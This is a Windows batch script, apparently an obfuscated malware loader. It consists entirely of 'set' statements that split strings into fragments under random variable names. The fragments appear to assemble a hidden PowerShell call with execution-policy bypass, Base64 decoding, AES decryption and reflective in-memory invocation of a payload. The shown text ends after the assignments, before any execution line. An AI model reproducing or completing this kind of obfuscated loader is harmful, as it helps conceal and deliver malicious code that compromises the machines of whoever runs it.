@echo off
set "DalICubnae= C"
set "qKpYEEzkSh=rs"
set "FkxgSYTYIl=\W"
set "dpONSxJMxc=he"
set "sSBpwkaKsW=Wi"
set "uZKGOffljz=he"
set "WnYSVTpmST=ll"
set "LGvANemBot=py"
set "gqaVUAxpHO=.e"
set "IvqFeAZgeI=rS"
set "ZLRFOPIzYT=st"
set "tqUeDjXCrT=Sy"
set "hCZRnmNFIm=ws"
set "cCkcrDNOZR=ow"
set "KKExaKyVlr=s\"
set "homMZuWLwS=we"
set "XdecCkdczP=Po"
set "geBUbNoTSr=y "
set "kNolssRVdn=po"
set "ikoMJZqxIc=do"
set "AFkppIWHLr=nd"
set "OiSGBVtCXR=:\"
set "oLCXWvxxKl=0\"
set "sGngoYphxO=we"
set "SHcVjdRzoR=xe"
set "xlLBlQbNoF=em"
set "cZXsUiEtTM=in"
set "kXXQvhDFXT=1."
set "pciPDBMzYc=\v"
set "pICKBHyvIY=ll"
set "javtXMHfzh=32"
set "pDJuyHhExW= /"
set "IhqoLdQlhf=co"
set "QSEzQvUwph= %~dp0"
set "rjZLeGwGlQ=cd"
set "wyKNOXrFuS=yIS."
set "tptRYWioId=$GJG"
set "lntYuSzpGd=vert"
set "vcJqwedjqq=Bmor"
set "zgByCRQmIW=ke($"
set "mlKAwPNmHU=;$Rw"
set "xtzDNWmMub=se()"
set "JLgNDQYujZ=);$N"
set "JhvVzYdrDF=ion."
set "BmiKUvqVIZ= [Sy"
set "VCdPJTAMOt=zk, "
set "fIuIjEtONG=; };"
set "FtOpXihHYg=vh.D"
set "uIOMIzSrWq=yste"
set "GzTVYIXBqo=S46e"
set "mLxlWuoKkg=y.Ci"
set "ifIvOrtRjc=  $q"
set "qUCghQIbvu=fore"
set "jDBSowEBZi='txe"
set "lRyTZVDwuv= [Sy"
set "eajshlIJFm=ateD"
set "dYMXGAvoNz=onve"
set "XTjxWbubml='dqR"
set "osNneVyXqF=esaB"
set "sTzLJJhPyR=$Ndk"
set "JHwLtfFKMm=lmZb"
set "KtdqmNqXVW=$dJQ"
set "mzSiUoZMyi=, (,"
set "cplFWvqVCT=Azk."
set "YBiPZBBykt=comm"
set "TqKGraShms=esFX"
set "uqwNkJNDYf=Syst"
set "HilDyJjAmd=lit("
set "mNORYPCYDW=]::("
set "QYZSLEuCyJ=a.En"
set "kWMNCfmlrf=.Mem"
set "jHoYqxAsUk=dkiB"
set "cHMWASXnyc=[Sys"
set "xZTnjPtKXO=sOgH"
set "rYEeNuCkoQ=yTo("
set "pzBVsFVddj=ress"
set "qhlwoXGHfx=6] -"
set "mrlmQZZkXZ=-joi"
set "XkoIXmDyIR=.Len"
set "qBTjAFHnIO=R.Su"
set "syQfmijMtk=t.Pa"
set "ohIGgcsfvP=iB ="
set "NThqBIcoxe=.Dis"
set "FhJHgGrEFW=ubR."
set "pQqYIDPZKR=-joi"
set "lGLbMBLdcm=y.Pa"
set "EiADqQWZSH=;$Qm"
set "HrvjifhCHL=);$i"
set "SeOAqSXnZa=('%*'"
set "XCxoFDogae=.-16"
set "KhjjHdQIcb='gni"
set "WzgoOQFjlJ=UGTu"
set "iaGgyjUpwF='[-1"
set "CdryjGAUkP=d;$G"
set "dYCgDofQdu=.Mod"
set "hlUFkHRzNl=;$Ng"
set "txHNtSoZvW=[Sys"
set "PtqNnrJvKj=$dJQ"
set "qQioaLySNM=tem."
set "PiizKllMsM= = $"
set "SDGKPZHNhe=);$G"
set "ypiMpjCtju=n ''"
set "DcqGhjFteU=();$"
set "LQtzdwPUcK=)) {"
set "BmzitFrdqS=join"
set "nVbGxrKqDs=ecry"
set "MhsSJUegun=m.IO"
set "bpsMPuduFQ=in $"
set "INZctjHOaM=oin "
set "vQThFSfEQf=16] "
set "cxdCTtzPRQ=ULR."
set "LRiWCRGcGy=Disp"
set "KYjFYiBUwJ=$Ndk"
set "AMHKVkYfZq=)($q"
set "bSBqJcKteO=bypa"
set "wdfXAcAShL=rity"
set "RdkItaYDDG===')"
set "MryvZTJdJG=idJv"
set "XtzCzzQUZY=Ndki"
set "fSlhgbaHCh=Invo"
set "NargBRQmvY=VHAz"
set "MsEnUZXiKC=bstr"
set "HGIizilthv=tsWi"
set "XPekUaotDn=[]] "
set "cThEtmtLrQ=$idJ"
set "eXsSfGmANE=em.I"
set "eHwemtEAGi=1] -"
set "aoTMekuwca=em.C"
set "zQecECiGdx=JGQt"
set "IAYyBJFRrr=ptog"
set "ZNYtBfAtwU=$dJQ"
set "FfzacVCYel=]::("
set "PHPCVYxygm=B) {"
set "mtoictKvtg=tS46"
set "JrpqYmFdBX=ionM"
set "XJnAwMNgoA=PKCS"
set "rdPEBslwTo=form"
set "zZZnbClnHb=Qt.I"
set "ZzxvzkcQTe=Mode"
set "JkWrqoSCDA=B = "
set "wfSaljKUBy=TllA"
set "vfZNnDPYro=-nop"
set "mSrhQhUoLb=nirt"
set "JjzZLzzjTV=Rwlg"
set "jXAHSHpuhU= = ["
set "yVVGgtMzmC=JGQt"
set "ALSZibiXQH=JU ="
set "tTsoVtiJLZ=y.Cr"
set "ZrolJQrdNg=.Cry"
set "wlPDwmxGjb=736u"
set "wrWYBiiTHr=);$d"
set "fqavuvbDaD= New"
set "eBJWHeTnMZ=ddin"
set "GQsyQRbjwR= = $"
set "pCopOUjvAJ='')("
set "FYOEToIqRr=::('"
set "gGywJvzYTZ=ing("
set "vTMTvvArqA=Ndki"
set "mcsDIUrSCl=esMa"
set "aTJkrEeQQH=yste"
set "Cyulyxcnvd=.Cop"
set "aZLdmPGjKh=gth)"
set "mfoNsmUkBb=Disp"
set "zPgvAwibrI=ULR "
set "EmXLdVIIYb=..-1"
set "pyFdIVYkfk=flec"
set "cIElgMPaPL=saBm"
set "DhQyMCnmvp=iB);"
set "ZPFJvrKrJJ=pose"
set "hlntXAuAxK=tem."
set "zuNzmfAjlv==');"
set "QWdCTsgZpT=rans"
set "kOdFnBuSxR=raph"
set "EiZPzopYZf=3); "
set "JBTuqUkdoA=nage"
set "tPhMXjLTuc=e = "
